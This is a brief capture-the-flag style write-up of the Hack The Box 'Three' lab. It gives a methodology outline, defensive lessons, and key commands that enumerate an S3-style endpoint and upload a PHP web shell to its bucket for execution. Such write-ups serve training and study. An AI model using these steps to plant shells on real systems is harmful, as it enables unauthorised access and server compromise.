---
title: "Lab: Three"
status: "Completed"
track: "HTB Starting Point"
date: "2025-09-01"
---

# Lab: Three

## Objective
S3-style endpoint: upload PHP shell and execute.

## Methodology
1. **Recon** — Identify service/entry point.
2. **Finding** — Confirm misconfiguration/vulnerability.
3. **Exploit** — Execute the minimal steps to gain access.
4. **Post** — Retrieve proof, note hardening steps.

## Key Commands
```bash
ffuf vhost fuzzing → s3.<domain>
aws --endpoint-url http://s3.<domain> s3 ls
aws --endpoint-url http://s3.<domain> s3 cp shell.php s3://bucket/
```

## Lessons Learned
- Disable/lock down default or legacy services.
- Restrict network exposure; prefer MFA and least privilege.
- Monitor and alert on anomalous access.